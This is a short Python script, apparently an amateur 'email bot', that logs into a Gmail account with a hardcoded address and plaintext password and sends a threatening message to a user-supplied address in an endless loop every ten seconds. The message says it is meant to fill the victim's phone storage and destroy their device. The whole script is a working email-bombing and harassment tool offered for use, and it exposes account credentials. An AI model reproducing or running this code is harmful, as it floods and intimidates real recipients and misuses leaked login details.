import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time
import datetime
print("Welcome to email bot")
time.sleep(1)
print("Enter sender email:- ")
receiver = input()

while True:
    print("Trying.....................")
    server = smtplib.SMTP('smtp.gmail.com' , 587)
    sender_email = 'anonymouslyhacking123@gmail.com'
    sender_pass = 'kumar9090@'

    subject = 'I can attack you announynously'

    message = '''Hi There , 
    I am a email bot which is used to send emails per 5 second   to full your phone storage as well as Destroy your device.
    Thank You 
    Regards
    '''
    print("validating Email.....................")
    time.sleep(1)
    print("Sending mail is in Progress.............")
    messager = MIMEMultipart()
    messager['From'] = sender_email
    messager['To'] = receiver
    messager['Subject'] = subject
    messager.attach(MIMEText(message , 'Plain'))
    text = messager.as_string()
    server.starttls()
    server.login(sender_email , sender_pass)
    server.sendmail(sender_email , receiver , text)
    server.quit()
    print("Mail Sent")
    timer = datetime.datetime.now()
    print(timer)
    time.sleep(10)
